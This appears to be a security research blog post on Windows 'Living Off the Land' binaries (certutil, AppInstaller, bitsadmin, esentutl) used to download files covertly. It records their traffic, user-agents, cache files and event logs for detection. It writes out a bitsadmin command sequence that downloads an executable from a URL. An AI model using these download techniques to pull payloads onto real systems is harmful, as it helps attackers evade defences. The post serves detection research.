---
slug: "lolbins-downloads"
title: "LOLBins - Download Files"
description: "Hands-on research exploring Living Off the Land Binaries that attackers use to covertly download files"
date: 2022-01-07
author: "Ryan Thompson"
tags: ["lolbins", "windows", "security", "detection"]
featured: true
editable: false
---

This hands-on research explores Living Off the Land Binaries (LOLBins) that attackers can use to covertly download files. I tested four tools on a Windows 10 system to understand their mechanisms and artifacts.

> I don't claim to be an expert and if you notice anything I misunderstood or got flat wrong it would be stellar if you gave me a shout.

## Certutil

[![Certutil](/blog-images/sneakydownloads-Certutil.png)](/blog-images/sneakydownloads-Certutil.png)

- Downloads files successfully using HTTP GET requests
- Generates two user-agents: "Microsoft-CryptoAPI" and "CertUtil URL Agent"
- Creates cached copies in InternetExplorer cache directories that persist until reboot
- Leaves IE-related artifacts that investigators could trace

[![Certutil File Download](/blog-images/sneakydownloads-CertutlFileDownload.png)](/blog-images/sneakydownloads-CertutlFileDownload.png)

[![Certutil Wireshark](/blog-images/sneakydownloads-CertutilWireshark.png)](/blog-images/sneakydownloads-CertutilWireshark.png)

[![Certutil File Creation](/blog-images/sneakydownloads-CertutilFilecreation.png)](/blog-images/sneakydownloads-CertutilFilecreation.png)

## AppInstaller.exe

[![AppInstaller](/blog-images/sneakydownloads-AppInstaller.png)](/blog-images/sneakydownloads-AppInstaller.png)

- Executes HTTP HEAD followed by GET requests without user-agent headers
- Successfully caches downloaded files despite application errors
- Has file size limitations (~buffer overflow at certain thresholds)
- Uses a proprietary shell item format designed for smaller installation references

[![AppInstaller CLI](/blog-images/sneakydownloads-AppInstallerCLI.png)](/blog-images/sneakydownloads-AppInstallerCLI.png)

[![AppInstaller HTTP Request](/blog-images/sneakydownloads-AppInstallerHTTPRequest.png)](/blog-images/sneakydownloads-AppInstallerHTTPRequest.png)

[![AppInstaller Invalid File Format](/blog-images/sneakydownloads-AppInstallerInvalidFileFormat.png)](/blog-images/sneakydownloads-AppInstallerInvalidFileFormat.png)

[![AppInstaller IE5 History](/blog-images/sneakydownloads-AppInstallerIE5History.png)](/blog-images/sneakydownloads-AppInstallerIE5History.png)

[![AppInstaller Inetcache File Creation](/blog-images/sneakydownloads-AppInstallerInetcacheFileCreation.png)](/blog-images/sneakydownloads-AppInstallerInetcacheFileCreation.png)

[![AppInstaller Open File](/blog-images/sneakydownloads-AppInstallerOpenFile.png)](/blog-images/sneakydownloads-AppInstallerOpenFile.png)

[![AppInstaller Failed Download](/blog-images/sneakydownloads-AppInstallerFailedDownload.png)](/blog-images/sneakydownloads-AppInstallerFailedDownload.png)

[![AppInstaller Python Error](/blog-images/sneakydownloads-AppInstallerPythonError.png)](/blog-images/sneakydownloads-AppInstallerPythonError.png)

[![AppInstaller Wireshark Reset](/blog-images/sneakydownloads-AppInstallerwiresharkreset.png)](/blog-images/sneakydownloads-AppInstallerwiresharkreset.png)

[![AppInstaller File Format](/blog-images/sneakydownloads-AppInstallerFileFormat.png)](/blog-images/sneakydownloads-AppInstallerFileFormat.png)

## BITSAdmin.exe

[![BITSAdmin](/blog-images/sneakydownloads-BITSAdmin.png)](/blog-images/sneakydownloads-BITSAdmin.png)

Requires four sequential commands:

```powershell
bitsadmin /create jobname
bitsadmin /addfile jobname http://url/file.exe c:\path\file.exe
bitsadmin /resume jobname
bitsadmin /complete jobname
```

[![BITSAdmin Error](/blog-images/sneakydownloads-BITSAdminError.png)](/blog-images/sneakydownloads-BITSAdminError.png)

[![BITSAdmin Working CLI](/blog-images/sneakydownloads-BITSAdminWorkingCLI.png)](/blog-images/sneakydownloads-BITSAdminWorkingCLI.png)

[![BITSAdmin CLI Temp File](/blog-images/sneakydownloads-BITSAdminCLITempFile.png)](/blog-images/sneakydownloads-BITSAdminCLITempFile.png)

Key characteristics:

- Creates temporary BITXXXX.tmp files during transfers
- Uses "Microsoft BITS/x.x" user agent
- Generates EventID 60 logs with URLs in Windows Operational logs
- Detectable via regex patterns matching IP addresses or anomalous domains

[![BITSAdmin Wireshark 2 Requests](/blog-images/SneakyDownloads-BITSAdminWireshark2Requests.png)](/blog-images/SneakyDownloads-BITSAdminWireshark2Requests.png)

[![BITSAdmin Wireshark User Agent](/blog-images/sneakydownloads-BITSAdminWiresharkUserAgent.png)](/blog-images/sneakydownloads-BITSAdminWiresharkUserAgent.png)

[![BITSAdmin Event Log Success](/blog-images/sneakydownloads-BITSAdminEventLogSuccess.png)](/blog-images/sneakydownloads-BITSAdminEventLogSuccess.png)

[![BITSAdmin Event Log Status Code](/blog-images/sneakydownloads-BITSAdminEventLogStatusCode.png)](/blog-images/sneakydownloads-BITSAdminEventLogStatusCode.png)

[![BITSAdmin Error Codes](/blog-images/sneakydownloads-BITSAdminErrorCodes.png)](/blog-images/sneakydownloads-BITSAdminErrorCodes.png)

## Esentutl.exe

[![Esentutl](/blog-images/sneakydownloads-Esentutl.png)](/blog-images/sneakydownloads-Esentutl.png)

- Requires SMB2 server infrastructure (SMB1 is rejected)
- Transfers files successfully but generates minimal obvious indicators
- Requires further research to identify attack signatures

[![Esentutl Impacket SMB1](/blog-images/sneakydownloads-EsentutlImpacketSMB1.png)](/blog-images/sneakydownloads-EsentutlImpacketSMB1.png)

[![Esentutl SMB1 Error](/blog-images/sneakydownloads-EsentutlSMB1Error.png)](/blog-images/sneakydownloads-EsentutlSMB1Error.png)

[![Esentutl Impacket SMB2](/blog-images/sneakydownloads-EsentutlImpacketSMB2.png)](/blog-images/sneakydownloads-EsentutlImpacketSMB2.png)

[![Esentutl Success](/blog-images/sneakydownloads-EsentutlSuccess.png)](/blog-images/sneakydownloads-EsentutlSuccess.png)

[![Esentutl Wireshark](/blog-images/sneakydownloads-EsentutlWireshark.png)](/blog-images/sneakydownloads-EsentutlWireshark.png)

## Detection Opportunities

Key forensic artifacts include:

- Cached files in InternetExplorer directories
- Event log entries (especially EventID 60 for BITS)
- User-agent strings in network traffic
